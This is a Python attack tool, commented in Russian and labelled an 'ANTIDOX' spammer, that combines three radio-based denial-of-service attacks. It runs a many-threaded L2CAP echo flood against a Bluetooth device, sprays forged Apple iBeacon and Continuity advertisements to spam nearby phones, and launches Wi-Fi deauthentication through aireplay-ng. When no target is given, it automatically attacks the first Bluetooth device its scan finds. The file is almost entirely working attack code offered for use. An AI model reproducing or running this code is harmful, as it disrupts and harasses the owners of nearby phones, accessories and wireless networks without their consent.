#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ANTIDOX FULL BLE + L2CAP + WIFI DEAUTH SPAMMER
# Совместимость: Raspberry Pi 5, Ubuntu 26.04, Python 3.13
# Автор: старший консультант ANTIDOX

import os
import sys
import time
import random
import struct
import socket
import threading
import subprocess
import multiprocessing
import signal
from datetime import datetime

# ========================================================================
# КОНСТАНТЫ
# ========================================================================
L2CAP_PSM_ANY = 0
L2CAP_PSM_SDP = 0x0001
L2CAP_PSM_RFCOMM = 0x0003
L2CAP_PSM_HID_CTRL = 0x0011
L2CAP_PSM_HID_INTR = 0x0013

L2CAP_COMMAND_REJ = 0x01
L2CAP_CONN_REQ = 0x02
L2CAP_CONN_RSP = 0x03
L2CAP_CONF_REQ = 0x04
L2CAP_CONF_RSP = 0x05
L2CAP_DISC_REQ = 0x06
L2CAP_DISC_RSP = 0x07
L2CAP_ECHO_REQ = 0x08
L2CAP_ECHO_RSP = 0x09
L2CAP_INFO_REQ = 0x0A
L2CAP_INFO_RSP = 0x0B

HCI_COMMAND_PKT = 0x01
BLE_ADV_TYPE_MANUFACTURER = 0xFF
APPLE_COMPANY_ID = 0x004C

# ========================================================================
# БЛОК 1: L2CAP-FLOOD
# ========================================================================
def create_l2cap_echo_packet(identifier, data=None):
    """Создаёт L2CAP Echo Request пакет"""
    if data is None:
        data = bytes([random.randint(0, 255) for _ in range(50)])
    cid = 0x0001
    cmd_code = L2CAP_ECHO_REQ
    cmd_id = identifier & 0xFF
    cmd_len = len(data)
    command = struct.pack('<BBH', cmd_code, cmd_id, cmd_len) + data
    packet_len = len(command) + 4
    header = struct.pack('<HH', packet_len, cid)
    return header + command

def l2cap_worker(target_mac, psm=L2CAP_PSM_SDP, rate=1000):
    """Поток для L2CAP-атаки"""
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
        sock.bind(('hci0', L2CAP_PSM_ANY))
        sock.connect((target_mac, psm))
        counter = 0
        while True:
            pkt = create_l2cap_echo_packet(counter, data=bytes([random.randint(0,255) for _ in range(50)]))
            sock.send(pkt)
            counter += 1
            time.sleep(1.0 / rate)
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

def start_l2cap_flood(target_mac, num_threads=80, rate=1500):
    """Запускает множество потоков L2CAP-флуда"""
    print(f"[L2CAP] Запуск {num_threads} потоков на {target_mac} с скоростью {rate} пакетов/сек")
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=l2cap_worker, args=(target_mac, L2CAP_PSM_SDP, rate), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.02)
    return threads

# ========================================================================
# БЛОК 2: BLE-СПАМ (iBeacon + Apple Continuity)
# ========================================================================
def send_hci_command(sock, ogf, ocf, params):
    """Отправляет HCI-команду через сырой сокет"""
    opcode = (ogf << 10) | ocf
    header = struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(params))
    sock.send(header + params)

def create_ibeacon_packet(uuid, major, minor, tx_power=-59):
    """Создаёт iBeacon-рекламный пакет"""
    data = bytearray()
    data.append(0x1A)  # длина
    data.append(0xFF)  # Manufacturer Specific Data
    data.extend([0x4C, 0x00])  # Apple ID
    data.append(0x02)  # iBeacon тип
    data.append(0x15)  # длина данных
    data.extend(bytes.fromhex(uuid.replace('-', '')))
    data.extend(struct.pack('>HH', major, minor))
    data.append(tx_power & 0xFF)
    return bytes(data)

def create_apple_continuity_packet(subtype, random_bytes=None):
    """Создаёт Apple Continuity (AirDrop/AirPlay) пакет"""
    if random_bytes is None:
        random_bytes = bytes([random.randint(0, 255) for _ in range(10)])
    data = bytearray()
    data.append(0x10)  # длина
    data.append(0xFF)  # Manufacturer Specific
    data.extend([0x4C, 0x00])  # Apple ID
    data.append(0x0F)  # Continuity тип
    data.append(0x05)  # подтип
    data.append(0xC1)  # флаг
    data.append(subtype & 0xFF)
    data.extend(random_bytes)
    data.extend([0x00, 0x00, 0x10])
    data.extend(bytes([random.randint(0,255) for _ in range(3)]))
    return bytes(data)

def ble_spam_worker(stop_event):
    """Поток для BLE-спама"""
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        sock.bind((0,))
        
        # Включаем рекламу
        send_hci_command(sock, 0x08, 0x000A, b'\x01')
        
        # Генерируем пул UUID для iBeacon
        uuids = [f"{random.randint(0, 2**128-1):032x}" for _ in range(100)]
        continuity_types = [0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2D, 0x2F, 0x01, 0x06, 0x20, 0xC0]
        
        packet_count = 0
        while not stop_event.is_set():
            # Случайный выбор типа атаки: 50% iBeacon, 50% Continuity
            if random.random() > 0.5:
                # iBeacon
                uuid = random.choice(uuids)
                major = random.randint(0, 65535)
                minor = random.randint(0, 65535)
                data = create_ibeacon_packet(uuid, major, minor)
            else:
                # Apple Continuity
                subtype = random.choice(continuity_types)
                data = create_apple_continuity_packet(subtype)
            
            # Отправка рекламных данных
            cmd_pkt = struct.pack('<B', len(data)) + data
            send_hci_command(sock, 0x08, 0x0008, cmd_pkt)
            packet_count += 1
            
            if packet_count % 100 == 0:
                print(f"[BLE] Отправлено {packet_count} пакетов")
            
            time.sleep(0.02)  # 50 пакетов/сек на поток
            
    except Exception as e:
        print(f"[BLE] Ошибка: {e}")
    finally:
        try:
            send_hci_command(sock, 0x08, 0x000A, b'\x00')
            sock.close()
        except:
            pass

# ========================================================================
# БЛОК 3: WIFI DEAUTH (требуется второй адаптер)
# ========================================================================
def wifi_deauth_worker(target_mac, interface='wlan1mon', stop_event=None):
    """Запускает aireplay-ng для деаутентификации"""
    try:
        # Переводим интерфейс в мониторный режим
        subprocess.run(['sudo', 'airmon-ng', 'start', interface], capture_output=True)
        # Запускаем деаут
        cmd = ['sudo', 'aireplay-ng', '-0', '0', '-a', target_mac, interface]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[WiFi] Деаут запущен на {interface} против {target_mac}")
        while not stop_event.is_set():
            time.sleep(1)
        proc.terminate()
    except Exception as e:
        print(f"[WiFi] Ошибка: {e}")

# ========================================================================
# БЛОК 4: ОСНОВНОЙ КЛАСС-ОРКЕСТРАТОР
# ========================================================================
class AntidoxSpammer:
    def __init__(self):
        self.target_bt_mac = None
        self.target_wifi_mac = None
        self.running = False
        self.threads = []
        self.stop_events = []
        
    def scan_for_devices(self):
        """Сканирует Bluetooth устройства и возвращает первый найденный MAC"""
        try:
            print("[SCAN] Сканирование Bluetooth устройств...")
            result = subprocess.run(['sudo', 'hcitool', 'scan'], capture_output=True, text=True)
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                for line in lines[1:]:
                    parts = line.split()
                    if len(parts) >= 2:
                        mac = parts[0]
                        name = ' '.join(parts[1:])
                        print(f"[SCAN] Найдено: {mac} - {name}")
                        return mac
        except Exception as e:
            print(f"[SCAN] Ошибка: {e}")
        return None
    
    def start(self, target_bt=None, target_wifi=None, mode='full'):
        """Запускает атаку"""
        if not target_bt:
            target_bt = self.scan_for_devices()
            if not target_bt:
                print("[!] Не удалось найти Bluetooth устройство. Укажите MAC вручную.")
                print(f"Использование: sudo python3 {sys.argv[0]} [BT_MAC] [WiFi_MAC]")
                return False
        
        self.target_bt_mac = target_bt
        self.target_wifi_mac = target_wifi
        self.running = True
        
        print("="*70)
        print(f"ANTIDOX FULL SPAMMER v2.0")
        print(f"Цель BT: {self.target_bt_mac}")
        if self.target_wifi_mac:
            print(f"Цель WiFi: {self.target_wifi_mac}")
        print("="*70)
        
        # Запускаем L2CAP флуд (80 потоков)
        if mode in ['full', 'l2cap']:
            l2cap_threads = start_l2cap_flood(self.target_bt_mac, 80, 1500)
            self.threads.extend(l2cap_threads)
        
        # Запускаем BLE спам (1 поток, но интенсивный)
        if mode in ['full', 'ble']:
            stop_event = threading.Event()
            self.stop_events.append(stop_event)
            t = threading.Thread(target=ble_spam_worker, args=(stop_event,), daemon=True)
            t.start()
            self.threads.append(t)
        
        # Запускаем WiFi деаут если указан MAC
        if self.target_wifi_mac and mode in ['full', 'wifi']:
            stop_event = threading.Event()
            self.stop_events.append(stop_event)
            t = threading.Thread(target=wifi_deauth_worker, args=(self.target_wifi_mac, 'wlan1mon', stop_event), daemon=True)
            t.start()
            self.threads.append(t)
        
        print("\n[+] Все атаки запущены. Нажмите Ctrl+C для остановки.")
        try:
            while self.running:
                time.sleep(5)
                # Статистика
                print(f"[STATUS] Активно потоков: {threading.active_count()}")
        except KeyboardInterrupt:
            self.stop()
        return True
    
    def stop(self):
        """Останавливает все атаки"""
        print("\n[!] Остановка всех атак...")
        self.running = False
        
        # Сигналим событиям остановки
        for ev in self.stop_events:
            ev.set()
        
        # Останавливаем L2CAP потоки (они daemon, просто ждём)
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=0.5)
        
        # Сброс Bluetooth адаптера
        try:
            subprocess.run(['sudo', 'hciconfig', 'hci0', 'reset'], capture_output=True)
        except:
            pass
        
        # Останавливаем WiFi
        try:
            subprocess.run(['sudo', 'airmon-ng', 'stop', 'wlan1mon'], capture_output=True)
        except:
            pass
        
        print("[+] Атаки остановлены. Bluetooth адаптер сброшен.")
        sys.exit(0)

# ========================================================================
# БЛОК 5: ТОЧКА ВХОДА
# ========================================================================
def main():
    # Проверка прав
    if os.geteuid() != 0:
        print("[!] Этот скрипт требует прав root. Запустите с sudo.")
        sys.exit(1)
    
    # Проверка Bluetooth адаптера
    try:
        subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], check=True)
    except:
        print("[!] Bluetooth адаптер hci0 не найден или недоступен.")
        sys.exit(1)
    
    # Создаём экземпляр спаммера
    spammer = AntidoxSpammer()
    
    # Парсим аргументы
    if len(sys.argv) >= 2:
        bt_mac = sys.argv[1]
    else:
        bt_mac = None
    
    if len(sys.argv) >= 3:
        wifi_mac = sys.argv[2]
    else:
        wifi_mac = None
    
    # Определяем режим
    mode = 'full'
    if len(sys.argv) >= 4:
        if sys.argv[3].lower() in ['l2cap', 'ble', 'wifi']:
            mode = sys.argv[3].lower()
    
    # Запускаем
    try:
        spammer.start(bt_mac, wifi_mac, mode)
    except KeyboardInterrupt:
        spammer.stop()
    except Exception as e:
        print(f"[!] Критическая ошибка: {e}")
        spammer.stop()

if __name__ == "__main__":
    main()
